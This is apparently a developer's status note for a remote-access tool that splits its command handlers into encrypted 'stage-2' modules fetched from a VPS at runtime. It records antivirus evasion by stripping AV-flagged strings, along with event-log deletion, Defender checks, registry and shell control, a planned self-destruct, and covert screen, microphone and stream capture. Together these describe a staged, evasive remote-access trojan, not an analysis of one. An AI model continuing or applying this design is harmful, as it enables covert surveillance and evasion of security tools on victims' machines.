---
name: project-stage2-status
description: Stage-2 rollout state — 17 commands extracted across filemgr/procmgr/defender, fallbacks wrapped in STAGE1_KEEP_FALLBACKS, blobs confirmed working in production
metadata:
  type: project
---

## Stage-2 modules extracted (3/6)

| Module | Commands | Tests | Size (.bin) |
|---|---|---|---|
| `filemgr.bin` | file_delete, file_mkdir, file_rename, file_copy, file_write_text, config_write (6) | 7/7 | 269 KB |
| `procmgr.bin` | proc_kill, proc_launch, term_exec, svc_control, reg_set/delete_value, reg_create/delete_key (8) | 9/9 | 247 KB |
| `defender.bin` | defender_status, host_restart, eventlog_delete (3) | 5/5 | 248 KB |

Total: **17 commands extracted, stage-2 live in production (v1.0.170+).**

## Fallback status (v1.0.172+)

Stage-1 handlers for all 17 commands are wrapped in `#ifdef STAGE1_KEEP_FALLBACKS`. Default CMake build does NOT define this, so those handlers compile out (→ `-40KB` + AV-string call-sites removed). If a blob isn't loaded when a command arrives, client gets `{"error":"<module> loading, retry in a moment"}`.

To build WITH fallbacks (debugging/airgap): `cmake -B build -DCMAKE_CXX_FLAGS="/DSTAGE1_KEEP_FALLBACKS=1"`

## What's NOT extracted yet

Each needs ABI expansion (HostCtx v2 with capture callbacks) or carries high operational risk:
- **defender iter 3**: `evtlog_set_config`, `host_update`, `self_destruct`
- **screenshot.bin**: session-0 + rundll32 user-session capture helper
- **audio.bin**: threaded mic capture + Opus + DSP chain
- **stream.bin**: full capture pipeline + H264 + multi-connection worker pool

## Deployment workflow for blobs

1. `python _gen_stage2_blob.py <room_token> build/stage2/filemgr.dll deploy/filemgr.bin`
2. `scp deploy/*.bin VPS:/opt/remotedesk/stage2/<room_token>/`
3. Restart host — auto-fetches via `stage2_fetch` on WSS auth'd connection.

Server now encrypts on-the-fly from plain `.dll` files in `/opt/remotedesk/stage2/` — no pre-encrypted blobs needed on VPS. See `project_stage2_live.md` for details.

## Rollback

`git checkout v1.0.164-last-working` — pre-stage-2 baseline (user-confirmed stable).
